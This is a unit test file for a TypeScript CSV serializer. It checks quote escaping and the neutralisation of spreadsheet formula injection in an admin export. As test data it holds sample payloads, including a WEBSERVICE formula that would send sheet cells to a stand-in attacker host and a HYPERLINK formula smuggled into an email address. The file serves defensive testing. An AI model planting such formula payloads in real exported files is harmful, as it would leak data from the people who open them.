// Unit tests for the CSV serializer. Two separate concerns are covered:
// RFC-4180 transport escaping (so a comma or quote can't break a column), and
// spreadsheet formula neutralization (so an admin opening the export doesn't
// execute a member's free text).

import { describe, test, expect } from 'bun:test'
import { toCsv } from './csv'

const BOM = '﻿'

// Strip the BOM and the header row so assertions read cleanly.
function body(csv: string): string[] {
  return csv.replace(BOM, '').split('\r\n').slice(1)
}

describe('toCsv — RFC-4180 escaping', () => {
  test('quotes every field and doubles embedded quotes', () => {
    expect(toCsv(['a'], [['he said "hi"']])).toBe(`${BOM}"a"\r\n"he said ""hi"""`)
  })

  test('contains commas and newlines within their column', () => {
    const rows = body(toCsv(['a', 'b'], [['x,y', 'line1\nline2']]))
    expect(rows[0]).toBe('"x,y","line1\nline2"')
  })

  test('emits a BOM so Excel reads UTF-8 correctly', () => {
    expect(toCsv(['a'], [])).toStartWith(BOM)
  })
})

describe('toCsv — spreadsheet formula neutralization', () => {
  // The live vector: cancellation-survey `note` is unrestricted member text and
  // lands in the admin CSV export.
  test('neutralizes a formula that would exfiltrate the sheet on open', () => {
    const payload = '=WEBSERVICE("https://attacker.example/?d="&CONCATENATE(B2,B3))'
    // Leading "'" forces text; inner quotes are still RFC-4180 doubled.
    expect(body(toCsv(['note'], [[payload]]))[0]).toBe(
      `"'${payload.replace(/"/g, '""')}"`,
    )
  })

  test('neutralizes every formula trigger character', () => {
    for (const trigger of ['=', '+', '-', '@', '\t', '\r']) {
      const value = `${trigger}cmd`
      expect(body(toCsv(['x'], [[value]]))[0]).toBe(`"'${value}"`)
    }
  })

  test('neutralizes a formula smuggled through an email address', () => {
    // "=" is valid atext in RFC-5322, so this is a registerable address.
    const email = '=HYPERLINK("https://evil.example")@example.com'
    expect(body(toCsv(['email'], [[email]]))[0]).toBe(
      `"'${email.replace(/"/g, '""')}"`,
    )
  })

  test('leaves ordinary values untouched', () => {
    const rows = body(
      toCsv(
        ['a', 'b', 'c'],
        [['plain text', 'user@example.com', '2026-07-28T00:00:00.000Z']],
      ),
    )
    expect(rows[0]).toBe('"plain text","user@example.com","2026-07-28T00:00:00.000Z"')
  })

  test('does not mangle a negative number mid-field or a hyphenated word', () => {
    // Only a LEADING trigger matters; an interior "-" is ordinary text.
    expect(body(toCsv(['x'], [['too-expensive']]))[0]).toBe('"too-expensive"')
    expect(body(toCsv(['x'], [['a - b']]))[0]).toBe('"a - b"')
  })

  test('still escapes quotes on a value it also neutralizes', () => {
    expect(body(toCsv(['x'], [['=A1&"z"']]))[0]).toBe(`"'=A1&""z"""`)
  })

  test('applies to header cells too', () => {
    expect(toCsv(['=evil'], [])).toBe(`${BOM}"'=evil"`)
  })
})
